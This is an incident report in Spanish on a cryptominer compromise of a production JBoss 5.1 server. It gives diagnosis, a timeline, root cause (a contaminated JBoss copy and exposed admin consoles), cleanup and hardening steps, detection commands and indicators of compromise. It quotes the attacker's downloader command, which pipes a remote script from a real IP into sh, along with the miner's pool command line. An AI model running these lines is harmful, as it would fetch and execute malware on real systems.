# Incidente TERDEMOL 2026-09-29: minero de criptomonedas en el servidor de producción

**Servidor:** TERDEMOL producción, `66.228.48.25` (`terdemol.net`), Ubuntu 24.04, JBoss 5.1.0.GA
**Fecha de atención:** 2026-09-29
**Estado:** contenido y limpio. Solo queda pendiente el HTTPS (ver al final).

> Horas en UTC, salvo que se indique otra cosa. El reloj del servidor está en UTC y los logs
> de JBoss en hora de La Paz (UTC-4), porque arranca con `-Duser.timezone=America/La_Paz`.

---

## 1. Síntoma

El panel de Linode mostraba el CPU **por encima del 200%** desde las ~09:00 del 29-sep. El servidor
tiene 2 núcleos y 4 GB de RAM. Reiniciar no sirvió: el consumo volvía a los pocos minutos.

## 2. Diagnóstico

| Hallazgo | Detalle |
|---|---|
| Proceso | `/home/jboss/.Qs3fA2qFED/kHJpalMaILey -o www.githubtopai.top:80 --tls --randomx-1gb-pages ...`: **XMRig** (minero de Monero, algoritmo RandomX). Corría como usuario `jboss`, con ~170% de CPU y ~1,7 GB de RAM; llenaba el swap. |
| Vigilante | `/home/jboss/.cache/.kwork/kwork`: relanza el minero cada vez que muere. Cada relanzamiento dejaba una carpeta oculta con nombre aleatorio en el home de jboss. |
| Persistencia | crontab de jboss (`@reboot` + `*/30 * * * *` para `kwork`), units de systemd de usuario (`67a685c8c173.service` con `Restart=always`, `Svcice.service`, `MySvcice.service`), **linger** activado para jboss (su systemd de usuario arranca con el servidor), `~/.config/autostart/*.desktop`, y una línea al final de `.bashrc` y `.profile` que lanzaba `kwork`. |
| Webshells | `deploy/ROOT.war/1.jsp`, `deploy/ROOT.war/cmd.jsp`, `deploy/admin-console.war/cmd.jsp`, `deploy/shell3.war`, `deploy/shell6.war`, y dentro de `deploy/management/`: `shells.war/shells.jsp`, `jexinv4.war/jexinv4.jsp` y `jexws4.war/jexws4.jsp` (de la herramienta JexBoss). |
| Otros binarios | `/usr/local/jboss/bin/solrca_clean` (ELF estático) y `logtmp.txt` (log del atacante, en chino). Además, dos copias de `l9cbb2` (ELF de 3,9 MB) escondidas en `/usr/local/jboss/docs/examples/varia/deployment-service/schema/` y `.../templates/no-tx-datasource-update/vm/`, y un `/usr/local/jboss/.bash_history` con el descargador `curl 194.38.23.2/ldr.sh \| sh`. Los tres llegaron con la copia de JBoss (sección "Causa raíz"). |
| Acceso a root | **No se encontraron señales.** `dpkg -V sudo perl perl-base` sale OK, no hay `/etc/ld.so.preload`, root no tiene crontab, no hay usuarios nuevos ni con uid 0, jboss no está en el grupo sudo y `/root/.ssh/authorized_keys` es de la instalación (sep-2025). |
| Aplicación | `khipus.ear` **intacto**: su sha256 (`0cc08deb…80c8`) es igual al de `v6.1.3.zip`. |

### Cronología

| Fecha (UTC) | Evento |
|---|---|
| 2025-04-20 | Se arma la copia de JBoss `D:\appserver\linode\jboss.tar.gz` / `jboss.zip` (dueño `ulysse`) copiando el JBoss de otra máquina, que ya estaba infectada. **La copia ya traía los webshells `ROOT.war/1.jsp`, `management/{shells,jexinv4,jexws4}.war`, los binarios `l9cbb2` y el `.bash_history` del atacante.** Esa máquina ya no existe. |
| 2025-09-10 23:19 | Se instala JBoss en TERDEMOL desde esa copia. El ctime de `1.jsp` es el mismo que el de `index.html`, y su mtime (abr-2025) viene de la copia. |
| 2026-09-11 15:42–17:13 | Primera persistencia: `Svcice`/`MySvcice` (cargador "qrl-start") e intento de descarga de `q-start.tar.gz`, que falló. |
| 2026-09-12 13:50–13:58 | Aparecen `shell3.war`, `shell6.war` y los `cmd.jsp` en `ROOT.war` y `admin-console.war`. |
| 2026-09-28 04:46 | Aparece `solrca_clean`. |
| 2026-09-29 09:25 (05:25 La Paz) | El log de JBoss registra accesos a `/jmx-console` y `/invoker` por el puerto público **8421** y varios redespliegues. Arranca el minero y el CPU sube a más de 200%. |
| 2026-09-29 17:58 y 19:11 | Reinicios del servidor. El minero vuelve a levantarse solo. |
| 2026-09-29 19:15–19:55 | Diagnóstico, contención, limpieza, rotación de credenciales y verificación (este documento). |

### Causa raíz

1. **Una copia de JBoss contaminada.** `D:\appserver\linode\jboss.tar.gz` y `jboss.zip` se armaron
   copiando el JBoss de una máquina que ya estaba infectada. Traían el webshell `1.jsp` (533 bytes,
   sha256 `940a674cfe8179b2b8964bf408037e0e5a5ab7e47354fe4fa7a9289732e1f1b8`; usa BASE64, `ClassLoader`
   y `defineClass`, así que carga clases enviadas por el atacante), `shells.jsp`, `jexinv4.jsp`,
   `jexws4.jsp`, dos binarios `l9cbb2` y el `.bash_history` del atacante. TERDEMOL se instaló desde esa
   copia, así que llevaba un año con una puerta trasera. Se comparó la copia con el `jboss-5.1.0.GA.zip`
   original, por nombre y tamaño de archivo: aparte de esos archivos y de los propios de KHIPUS
   (`khipus.ear`, `khipus-ds.xml`, `run.conf`, conector de MySQL), es igual al original. El original está limpio.
2. **Consolas de administración expuestas a internet.** `jmx-console`, `http-invoker`, `management`
   y `admin-console` respondían por el 8421, el mismo puerto de KHIPUS, sin autenticación.
   Permiten desplegar código y ejecutar comandos.

No hay access log de JBoss (el `AccessLogValve` está desactivado), así que no se puede saber cuál
de las dos puertas se usó primero. Las dos quedaron cerradas.

## 3. Solución aplicada

**Contención**
1. `systemctl stop khipus-jboss`, `loginctl disable-linger jboss`, `pkill -9 -u jboss`.
2. Respaldo de la evidencia en `/root/incidente-2026-09-29/`: copia del home de jboss (`home-jboss.tgz`) y su crontab.
3. `crontab -r -u jboss`.

**Limpieza.** Lo que estaba en `deploy/` y en `bin/` se **movió** a evidencia, no se borró.
4. Movidos a `/root/incidente-2026-09-29/deploy-quitado/`: `shell3.war`, `shell6.war`, `admin-console.war`,
   `jmx-console.war`, `http-invoker.sar`, `management` (incluye `shells.war`), `jmx-invoker-service.xml`,
   `legacy-invokers-service.xml`, `ROOT.war/cmd.jsp`.
5. Movidos a `.../bin-quitado/`: `solrca_clean`, `logtmp.txt`. Movidos a `.../restos/`: `ROOT.war/1.jsp`,
   `~/.config/autostart`, `~/.config/Svcice.linger` y `/tmp/.c97fc6f8a98eb351`.
6. Vaciados `server/default/work` y `server/default/tmp`, donde quedan los JSP compilados.
7. Borrado el malware del home de jboss (`.cache/.kwork`, las carpetas aleatorias, `.local/libexec`,
   `.q-start*`, `~/.config/systemd/user`) y quitadas las líneas de `kwork` de `.bashrc` y `.profile`.

**Endurecimiento**
8. ufw: se quitó la regla del **3306**. Solo quedan abiertos el **22** y el **8421**. Para conectarse a MySQL
   desde afuera ahora se usa un túnel: `ssh -N -L 3307:127.0.0.1:3306 terdemol@66.228.48.25` → `localhost:3307`.
9. MySQL: se **cambió la clave** de `admin@localhost` con `ALTER USER … REPLACE` (conserva los mismos grants:
   `ALL PRIVILEGES ON sic_terdemol.* WITH GRANT OPTION`) y se actualizó en `khipus-ds.xml`. La versión
   anterior del archivo está en `/root/incidente-2026-09-29/khipus-ds.xml.antes`. La clave nueva **no** se
   documenta aquí. `dump_terdemol.sh` la pide de forma interactiva.
10. MySQL: se eliminó la cuenta `admin@'190.106.249.81'`, que se usaba para la conexión directa al 3306 y
    tenía la clave vieja.
11. PC local: las copias contaminadas se renombraron a `jboss.tar.gz.CONTAMINADO` y `jboss.zip.CONTAMINADO`
    para que nadie vuelva a instalar desde ellas.

**Segunda pasada**, tras comparar la copia contaminada con el JBoss original:

12. Se borraron los dos `l9cbb2` y `/usr/local/jboss/.bash_history`. `jexinv4.war` y `jexws4.war` ya habían
    salido del servidor junto con la carpeta `management` (paso 4).
13. La carpeta `/usr/local/jboss/docs` **se conserva**: `server/default/conf/jax-ws-catalog.xml` usa
    `docs/schema/*.xsd`.
14. Se cambió la clave de sudo de `terdemol`.
15. Se borró la carpeta de evidencia `/root/incidente-2026-09-29/` porque no se va a hacer análisis forense ni
    denuncia. Lo aprendido queda en este documento.
16. Código: `AuthenticatorAction` toma la IP real del encabezado `X-Real-IP` cuando la petición viene de nginx
    (R5 del requerimiento de HTTPS). Sin nginx se comporta igual que antes.

**Verificación (19:54 UTC)**
- Carga 0,04. El único proceso de jboss es el java de KHIPUS.
- `/khipus/` → 200. `/jmx-console`, `/invoker/JMXInvokerServlet`, `/management`, `/admin-console`,
  `/web-console` y `/status` → 404.
- Sin crontab, sin linger, sin units de usuario y sin `kwork` en los archivos de arranque de sesión de jboss.
- Tras la segunda pasada (21:21 UTC): no queda ningún ejecutable ELF fuera de lo normal en `/usr/local/jboss`,
  y la carga está en 0,00.

## 4. Pendientes

- [x] Cambiar la clave de sudo de `terdemol`.
- [x] Borrar la evidencia de `/root/incidente-2026-09-29/`.
- [ ] Poner nginx con HTTPS delante de JBoss: ver `requerimiento_https_nginx_terdemol.md`.

## 5. Regla para instalar JBoss en un servidor

La instalación de TERDEMOL es correcta en su forma (`/usr/local/jboss`, perfil `server/default`,
`khipus.ear` y `khipus-ds.xml` en `deploy/`, servicio `khipus-jboss`). El problema fue **de dónde salió
JBoss**. Por eso, en cualquier instalación nueva o reinstalación:

1. Instalar **siempre desde el `jboss-5.1.0.GA.zip` original**. **Nunca copiar JBoss de otro servidor.**
2. Antes de exponerlo a internet, sacar de `deploy/` las consolas: `jmx-console.war`, `http-invoker.sar`,
   `management`, `admin-console.war`, `jmx-invoker-service.xml` y `legacy-invokers-service.xml`.
3. Después, agregar solo lo propio: `khipus.ear`, `khipus-ds.xml`, el conector de MySQL y `run.conf`.
4. Comprobar que `ROOT.war` no traiga `.jsp` y que no haya ejecutables ELF fuera de lo normal (comando en la sección 6).

## 6. Cómo detectar si vuelve

```bash
top -b -n1 -o %CPU | head -12                       # algo distinto de java/mysqld arriba = alerta
ps -u jboss -o pid,args                             # solo debe estar run.sh + java
sudo crontab -l -u jboss                            # debe decir "no crontab for jboss"
ls /var/lib/systemd/linger                          # jboss no debe aparecer
sudo ls -la /home/jboss /home/jboss/.config         # sin carpetas ocultas con nombres aleatorios
ls /usr/local/jboss/server/default/deploy           # sin *.war extraños ni consolas
sudo find /usr/local/jboss -name '*.jsp' -newer /usr/local/jboss/server/default/deploy/khipus.ear ! -path '*/work/*'
# ejecutables fuera de lo normal: no debe mostrar nada
sudo find /usr/local/jboss -type f -size +100k ! -name '*.jar' ! -name '*.ear' ! -name '*.war' ! -name '*.rar' ! -name '*.zip' -exec sh -c 'head -c4 "$1" | grep -q ELF && echo "$1"' _ {} \;
```

**Indicadores de compromiso:** dominio `githubtopai.top` e IP `194.38.23.2`; procesos o rutas `kwork`, `Svcice`,
`MySvcice`, `qrl-start`, `solrca_clean`, `l9cbb2`; archivos `cmd.jsp`, `shell*.war`, `ROOT.war/1.jsp`,
`shells.war`, `jexinv4.war`, `jexws4.war`; sha256 `940a674c…f1b8` (`1.jsp`).
